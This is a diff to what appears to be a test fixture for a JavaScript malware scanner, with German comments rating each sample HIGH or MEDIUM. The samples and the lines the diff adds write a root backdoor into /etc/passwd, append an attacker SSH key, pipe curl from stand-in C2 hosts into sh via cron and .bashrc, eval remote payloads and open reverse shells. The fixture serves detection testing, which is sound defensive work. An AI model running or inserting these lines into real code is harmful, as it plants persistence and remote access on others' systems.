@@ -200,8 +200,8 @@ eval(Buffer.from(atob("cHJvY2Vzcy5leGl0KDApCg=="), 'base64'));
 // HIGH: langer Hex-String via Buffer.from (32+ Hex-Zeichen)
 Buffer.from("deadbeefcafe0123456789abcdef001122334455", "hex");
 
-// HIGH: langer Base64-String via Buffer.from (40+ Zeichen)
-Buffer.from("SGVsbG8gV29ybGQhIFRoaXMgaXMgYSBiYXNlNjQ=", "base64");
+// HIGH: langer Base64-String via Buffer.from (40+ Zeichen ohne Padding)
+Buffer.from("SGVsbG8gV29ybGQhIFRoaXMgaXMgYSBiYXNlNjQgZW5jb2RlZCBwYXlsb2Fk", "base64");
 
 // HIGH: String.fromCharCode mit vielen Argumenten (6+)
 String.fromCharCode(115, 101, 99, 114, 101, 116, 32, 112, 97, 121, 108, 111, 97, 100);
@@ -254,8 +254,11 @@ fs.writeFile('/etc/passwd', 'backdoor:x:0:0:root:/root:/bin/bash\n', () => {});
 // HIGH: Schreiben in authorized_keys (SSH-Backdoor)
 fs.appendFile('/home/user/.ssh/authorized_keys', 'ssh-rsa AAAA evil@attacker.com\n', () => {});
 
-// MEDIUM: Schreiben in Cron-Verzeichnis
+// HIGH: Schreiben in /etc/cron (verdraengt MEDIUM-Cron-Regel auf gleicher Zeile)
 fs.writeFile('/etc/cron.d/backdoor', '* * * * * root curl http://c2.example.com | sh\n', () => {});
+
+// MEDIUM: Cron-Verzeichnis ausserhalb /etc/cron — loest MEDIUM-Regel ohne HIGH-Ueberschattung aus
+fs.appendFile('/var/spool/cron/crontabs/user', '* * * * * curl http://c2.evil.example.com | sh\n', () => {});
 
 // MEDIUM: Schreiben in .bashrc (Persistenz)
 fs.appendFile('/home/user/.bashrc', '\ncurl http://c2.evil.example.com/init | sh\n', () => {});
@@ -277,8 +280,11 @@ https.get('http://c2.evil.example.com/payload', d => { eval(d.toString()); });
 // HIGH: Reverse-Shell via net.connect an stdin/stdout gebunden
 net.connect(4444, 'attacker.evil.example.com', function() { process.stdin.pipe(this); this.pipe(process.stdout); });
 
-// HIGH: /bin/sh Reverse-Shell-Muster
+// HIGH: child_process.spawn mit /bin/sh (child_process-Regel verdraengt /bin/sh-Regel, gleiche Kategorie)
 require('child_process').spawn('/bin/sh', ['-i'], {stdio: ['pipe', socket, 'pipe']});
+
+// HIGH: /bin/sh ohne require('child_process') — loest /bin/sh-Regel isoliert aus
+execFileSync('/bin/sh', ['-c', cmd], { stdio: socket });
 
 // ── CRYPTOMINING ─────────────────────────────────────────────────────────────
 
